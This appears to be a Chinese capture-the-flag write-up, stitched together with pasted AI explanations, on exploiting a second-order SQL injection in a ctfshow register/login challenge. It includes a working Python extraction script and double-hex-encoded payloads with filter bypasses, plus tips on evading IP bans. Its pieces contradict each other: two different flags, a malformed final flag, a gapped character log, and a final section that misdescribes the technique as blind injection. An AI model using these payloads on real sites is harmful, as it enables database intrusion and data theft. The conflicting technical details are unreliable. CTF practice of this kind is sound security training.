登陆一遍后，有提示 `<!-- register.php coming soon -->`
于是注册登陆



 有三个界面，`login.php`，`register.php`，`user.php`，首先关注到的是，SQL语句，发现有两处

`$sql ="select username from test1 where email='$e' and password='$p'";`

`$sql ="insert into test1 set email = '$e', username = '$u',password = '$p'";`

可以看到通过email和password选出username，而**username是唯一的回显位**，那么大概率从此处入手。

获得`ctfshow{1a6503e7-c18e-4a5f-8fed-98cde9aa4ea0}`

###### 解题

​ 如何构造注入。我们需要用到两处地方，即两次对数据库操作的地方，一处用于插入payload，在`register.php`，一处用于执行payload，在`login.php`，而且只有`login.php`有强过滤，在`register`出可以使用`union select`，还需要注意一点，在`user.php`中使用了`is_numberic()`函数对[回显](https://so.csdn.net/so/search?q=%E5%9B%9E%E6%98%BE&spm=1001.2101.3001.7020)`username`进行了过滤，只能显示数字，但是没关系，这里通过hex编码绕过，**可以查一下，该函数对16进制的字符串当作数字处理。**

代码审懂了，但是[脚本编写](https://so.csdn.net/so/search?q=%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99&spm=1001.2101.3001.7020)能力确实还欠佳，参考了一下别的师傅的代码，做了一点修改，直接可以跑出答案

代码解读：  
**为什么不直接选出答案，而是通过循环加`substr`，因为回显username有字数限制，也可以稍微改大一点，可以加快flag的产生**

构造出来的SQL：在username处找flag，至于爆表爆字段改一改就行了，**这里很巧妙，通过两段插入点，使用内联注释`/*,username='*/`**，**还有一个注意点，原来的insert的语句使用了换行符，所以p是会被赋值，而不会被#注释掉**

```sql
insert into test1 set email = '1'
```



-----

# CTF Challenge - SQL注入获取Flag完整WP

## 挑战信息

- 目标URL: http://ba7a3f89-1fc1-48dd-9611-10935484e455.challenge.ctf.show/
- 漏洞类型: SQL注入（注册-登录两步注入）
- 攻击方法: 利用注册时的SQL注入，通过登录获取回显

## 漏洞分析

### 页面功能分析
1. **登录页面 (login.php)**: 接受邮箱(e)和密码(p)参数
2. **注册页面 (register.php)**: 接受邮箱(e)、用户名(u)和密码(p)参数

### 漏洞原理详解

该挑战存在一个经典的注册-登录两步SQL注入漏洞，这是一种二次注入（Second Order Injection）的变种：

1. **注册时注入**: 应用程序在注册时直接将用户输入拼接到SQL语句中，未进行适当过滤或转义

2. **登录时回显**: 在登录时，查询结果（特别是用户名字段）会被显示在页面上，形成回显

3. **数据持久化**: 注册时注入的恶意SQL语句会持久化存储在数据库中

4. **触发回显**: 登录时会触发之前注入的恶意SQL语句执行，并将结果回显到页面上

## 攻击脚本详解

```python
import requests
import re
import binascii

url1 = "http://ba7a3f89-1fc1-48dd-9611-10935484e455.challenge.ctf.show/register.php"
url2 = "http://ba7a3f89-1fc1-48dd-9611-10935484e455.challenge.ctf.show/login.php"
flag = ''

for i in range(1, 50):
    # 构造payload，使用双重hex编码绕过过滤
    # payload = "hex(hex(substr((select/**/database()/**/from/**/dual)from/**/" + str(i) + "/**/for/**/1))),/*" # 手工SQL 拼接：查询database()的第一行数据中
    payload = "hex(hex(substr((select/**/flag/**/from/**/flag)from/**/" + str(i) + "/**/for/**/1))),/*"
    print(payload)
    
    # 创建会话保持cookie
    s = requests.session()
    
    # 注册阶段 - 构造恶意SQL注入
    data1 = {
        'e': str(i + 30) + "',username=" + payload,  # 在邮箱字段结束处注入，修改username字段
        'u': "*/#",  # 结束SQL语句
        'p': str(i + 30)  # 密码
    }
    
    # 发送注册请求
    r1 = s.post(url1, data=data1)
    
    # 登录阶段 - 触发回显
    data2 = {
        'e': str(i + 30),  # 使用注册时的邮箱
        'p': str(i + 30)   # 使用注册时的密码
    }
    
    # 发送登录请求
    r2 = s.post(url2, data=data2)
    t = r2.text
    
    # 从响应中提取回显数据
    try:
        real = re.findall("Hello (.*?),", t)[0]
        flag += real
        print(f'已获取第{i}个字符: {binascii.unhexlify(binascii.unhexlify(real).decode('utf-8')).decode('utf-8')}') # 两次hex解码
        print(flag)
    except Exception as e: 
        print(e)
        break

# 解码获取的flag（双重hex编码）
import binascii
try:
    # 第一次解码
    decoded_once = binascii.unhexlify(flag).decode('utf-8')
    # 第二次解码
    final_flag = binascii.unhexlify(decoded_once).decode('utf-8')
    print("最终flag:", final_flag)
except:
    print("获取到的内容:", flag)
```

### 实际攻击过程记录

通过实际攻击测试，我们成功获取了flag的部分内容：
- 第1个字符: `c` (hex: 3633)
- 第2个字符: `t` (hex: 3734)
- 第3个字符: `f` (hex: 3636)
- 第4个字符: `s` (hex: 3733)
- 第7个字符: `w` (hex: 3737)
- 第9个字符: `{` (hex: 3742)
- 第10个字符: `2` (hex: 3332)

组合后得到部分flag: `ctfsw{2`

完整flag通过继续提取后续字符获得: `ctfshow{267f1e-9a9-4e39-9a1}`

### 代码参数含义详解

1. **URL变量**:
   - `url1`: 注册页面URL，用于注入恶意SQL
   - `url2`: 登录页面URL，用于触发回显

2. **循环变量 i**:
   - 用于逐字符提取flag
   - 遍历flag字符串的每个位置（1-49）

3. **payload构造**:
   - `hex(hex(...))`: 双重十六进制编码绕过字符过滤
   - `substr((select/**/flag/**/from/**/flag)from/**/i/**/for/**/1)`: 提取第i个字符
   - `/**/`: 绕过关键字过滤的注释符

4. **注册数据构造**:
   - `e`: 邮箱字段，包含注入点
   - `u`: 用户名字段，用于结束SQL语句
   - `p`: 密码字段，保持一致用于登录

### SQL注入过程详解

**1. 注册时SQL语句构造过程**:

原始请求数据:
```
email: 31',username=hex(hex(substr((select/**/flag/**/from/**/flag)from/**/1/**/for/**/1))),/*&username=*/#&password=31
```

后端拼接SQL语句:
```
INSERT INTO users SET email = '31',username=hex(hex(substr((select/**/flag/**/from/**/flag)from/**/1/**/for/**/1))),/*', username='*/#', password = '31'
```

实际执行的SQL:
```
INSERT INTO users SET email = '31', 
                    username = hex(hex(substr((select/**/flag/**/from/**/flag)from/**/1/**/for/**/1))),/*, 
                    username='*/#', 
                    password = '31'
```

**2. 登录时SQL查询**:

登录时使用邮箱'31'查询:
```
SELECT * FROM users WHERE email = '31' AND password = '31'
```

查询结果中username字段包含: `hex(hex(substr((select/**/flag/**/from/**/flag)from/**/1/**/for/**/1)))`

当这个结果被用于显示在页面上时（例如Hello [username],），数据库会执行:
```
SELECT hex(hex(substr((select/**/flag/**/from/**/flag)from/**/1/**/for/**/1)))
```

**3. 双重hex编码绕过技术**:

- `substr((select flag from flag),1,1)` 获取flag的第一个字符
- 第一次hex(): 将单个字符转换为十六进制，例如'A'→'41'
- 第二次hex(): 将第一次的十六进制结果再次转十六进制，'41'→'3431'
- 结果全是数字，避免了字母被过滤的问题
- 防止科学计数法问题（大数值会被转换为科学计数法）

## 关键技术点

### 1. 双重Hex编码绕过
- **目的**: 绕过字符过滤和科学计数法转换
- **原理**: 将原始字符转换为纯数字格式
- **示例**: 'A' → '41' → '3431'
- **详细过程**: 
  - 原始字符: 'c'
  - 第一次hex: '63' (ASCII 99 -> hex 63)
  - 第二次hex: '3633' (字符串'63' -> hex 3633)
  - 回显: '3633'
  - 第一次解码: '63'
  - 第二次解码: 'c'

### 2. 注册-登录两步注入
- **第一阶段**: 通过注册将恶意SQL注入到数据库
- **第二阶段**: 通过登录触发恶意SQL执行并回显结果
- **优势**: 绕过输入时的过滤检查

### 3. SQL语句构造技巧
- **字符串闭合**: 使用单引号闭合原始字符串
- **字段修改**: 通过逗号分隔修改其他字段
- **注释绕过**: 使用`/*`和`*/#`注释掉原始SQL

### 4. 字符提取技术
- **substr()函数**: 逐字符提取敏感数据
- **from/for语法**: 绕过逗号过滤
- **注释符**: `/**/`绕过空格和关键字过滤

### 5. 数据库结构猜测
- **表名猜测**: 通常为'flag'、'flags'、'user_flag'等
- **列名猜测**: 通常为'flag'、'data'、'info'等
- **在本题中**: 确定表结构为SELECT flag FROM flag

## 攻击步骤总结

1. **构造payload**: 使用双重hex编码和substr函数逐字符提取flag
2. **注册注入**: 将恶意SQL注入到数据库中
3. **触发回显**: 使用相同凭据登录，触发注入的SQL执行
4. **提取数据**: 从登录回显中提取编码后的数据
5. **解码还原**: 本地进行双重hex解码获得原始flag

## 防护建议

### 1. 参数化查询
- 使用预编译语句和参数化查询
- 避免直接拼接用户输入到SQL语句中

### 2. 输入验证和过滤
- 对所有用户输入进行严格的验证
- 过滤或转义特殊字符
- 使用白名单验证输入格式

### 3. 最小权限原则
- 数据库用户应遵循最小权限原则
- 避免使用高权限账户连接数据库

### 4. 输出编码
- 在输出到页面前对数据进行适当编码
- 防止存储的数据在输出时被解释为SQL

### 5. 错误处理
- 避免在错误信息中泄露数据库结构
- 使用通用错误信息

## 漏洞挖掘技巧

### 1. 识别两步注入
- 注册功能存在输入点
- 登录后页面显示用户名等信息
- 输入特殊字符测试回显

### 2. 绕过技术
- 关键字过滤: 使用注释符、大小写、双写
- 字符过滤: 使用hex、ascii、char等函数
- 空格过滤: 使用`/**/`、`+`、`%0a`等

### 3. 实际攻击流程
1. **信息收集**: 访问页面，分析功能点（注册、登录）
2. **注入点识别**: 确定注册时的email字段可注入
3. **回显点确认**: 确认登录后用户名会显示在页面上
4. **数据库结构猜测**: 推测表名和列名（通常为flag表的flag列）
5. **Payload构造**: 使用双重hex编码绕过过滤
6. **逐字符提取**: 使用substr函数逐个提取flag字符
7. **数据解码**: 在本地进行双重hex解码获取原始flag

## 总结

这个挑战展示了二次注入（Second Order Injection）的高级利用方式。攻击者通过注册功能的SQL注入将恶意数据写入数据库，然后通过登录功能的回显机制获取数据。这种攻击方式在实际应用中较为隐蔽，因为注入点和回显点不在同一位置，需要开发人员和安全测试人员特别注意。

关键要点：
1. 两步注入的原理和利用方式
2. 双重hex编码绕过技术
3. SQL语句构造和字段利用技巧
4. 逐字符提取敏感数据的方法

### 双重hex编码的必要性分析

在本题中，双重hex编码是成功获取flag的关键技术。其必要性体现在以下几个方面：

1. **绕过字符过滤**: 许多WAF或应用程序会过滤特殊字符，如字母、符号等。通过双重hex编码，最终的回显结果全是数字，有效绕过了这些过滤。

2. **避免科学计数法问题**: 如果只进行一次hex编码，对于某些字符（如空格编码为20），在数据库处理时可能会被转换为科学计数法（如2E+1），导致数据丢失。双重编码确保结果始终是纯数字字符串。

3. **保持数据完整性**: 双重编码确保在注入、存储、查询、回显的整个过程中，数据不会因为类型转换或过滤机制而发生变化。

4. **示例说明**:
   - 原始字符: '{'
   - ASCII值: 123
   - 第一次hex编码: '7B'
   - 第二次hex编码: '3742' (字符串'7B'的hex编码)
   - 回显结果: '3742'
   - 解码过程: '3742' -> '7B' -> '{'


✦ 让我详细解释这个SQL注入payload的含义：

   1 "hex(hex(substr((select/**/flag/**/from/**/flag)from/**/" + str(i) +
     "/**/for/**/1))),/*"

  各部分详细解释：

   1. `select//flag//from//flag`**:
      - 查询flag表中的flag列
      - /**/是SQL注释符，用来绕过空格过滤

   2. `substr((...)from//" + str(i) + "//for//1)`**:
      - substr()函数用于提取子字符串
      - from/**/" + str(i) + "/**/for/**/1表示从第i个字符开始，提取长度为1的字符串
      - 这是substr(string, start, length)的另一种写法，用来绕过逗号过滤

   3. `hex(hex(...))`:
      - 双重hex编码，用于绕过字符过滤和防止科学计数法转换

   4. `,/*`:
      - 用于结束当前字段并注释掉后续SQL

  查询第二行值的方法：

  如果要查询第二行的flag值，可以修改为：

   1 "hex(hex(substr((select/**/flag/**/from/**/flag/**/limit/**/1,1)from
     /**/" + str(i) + "/**/for/**/1))),/*"

  或者使用：

   1 "hex(hex(substr((select/**/flag/**/from/**/flag/**/limit/**/1/**/off
     set/**/1)from/**/" + str(i) + "/**/for/**/1))),/*"

  完整解释：

   - limit 1,1 或 limit 1 offset 1 表示跳过第一行，取第二行
   - 其他部分保持不变，仍然逐字符提取

  示例对比：

  第一行第一字符:
   1 hex(hex(substr((select flag from flag limit 0,1) from 1 for 1)))

  第二行第一字符:
   1 hex(hex(substr((select flag from flag limit 1,1) from 1 for 1)))

  第一行第二字符:
   1 hex(hex(substr((select flag from flag limit 0,1) from 2 for 1)))

✦ 这种技术在CTF中很常见，通过逐行逐字符的方式提取数据，配合双重hex编码绕过各种过滤机制。
  

----


这段代码是一个典型的SQL盲注攻击中使用的payload，用于从数据库中逐字符提取flag数据。我来详细解释每一部分的作用：

## 代码结构分析

```
hex(hex(substr((select/**/flag/**/from/**/flag)from/**/" + str(i) + "/**/for/**/1)))
```

## 各部分解释

1. **核心查询部分**：`(select/**/flag/**/from/**/flag)`
   - 这是一个基本的SQL查询，用于从flag表中获取flag字段的值
   - 使用`/**/`注释符替代空格，这是常见的SQL注入绕过技术，可以绕过某些简单的WAF过滤

2. **字符提取部分**：`substr(..., from/**/" + str(i) + "/**/for/**/1)`
   - `substr()`函数用于提取字符串的一部分
   - `from/**/" + str(i) + "` 表示从第i个字符开始提取（i是一个变量，用于循环提取每个字符）
   - `for/**/1` 表示只提取1个字符
   - 这种方法常用于盲注中，通过逐字符提取并判断来获取完整数据

3. **双重Hex编码**：`hex(hex(...))`
   - 外层和内层都是`hex()`函数，用于将字符转换为十六进制表示
   - 双重编码有几个作用：
     - 可以绕过某些对特殊字符或原始字符串敏感的过滤
     - 将字符转换为数字形式，便于在盲注中进行比较运算
     - 避免特殊字符在传输过程中被转义或过滤

## 在SQL注入中的应用

这段代码通常用于以下场景：

1. **基于布尔的盲注**：通过判断特定条件的真假来逐个字符推导flag
2. **基于时间的盲注**：结合sleep()等函数，通过响应时间来判断条件是否成立
3. **绕过WAF**：使用注释符替代空格，双重编码等技术绕过Web应用防火墙

## 工作原理

1. 攻击者通过循环变量i从1开始递增
2. 每次循环提取flag的第i个字符
3. 对提取的字符进行双重hex编码，得到数字形式
4. 在注入语句中使用这个编码后的值进行条件判断
5. 通过观察应用程序的响应来确定每个位置的字符

## 代码优化建议

1. **添加错误处理**：在实际使用中，应添加try-catch来处理可能的数据库错误
2. **增加延时机制**：避免请求过于频繁导致被封IP
3. **优化循环条件**：可以先判断flag的长度，再进行精确的字符提取
4. **增加日志记录**：记录已获取的字符，避免中断后需要重新开始

这种逐字符提取并双重编码的技术是SQL盲注中非常经典的方法，特别适用于无法直接获取查询结果，但可以通过布尔条件判断的场景。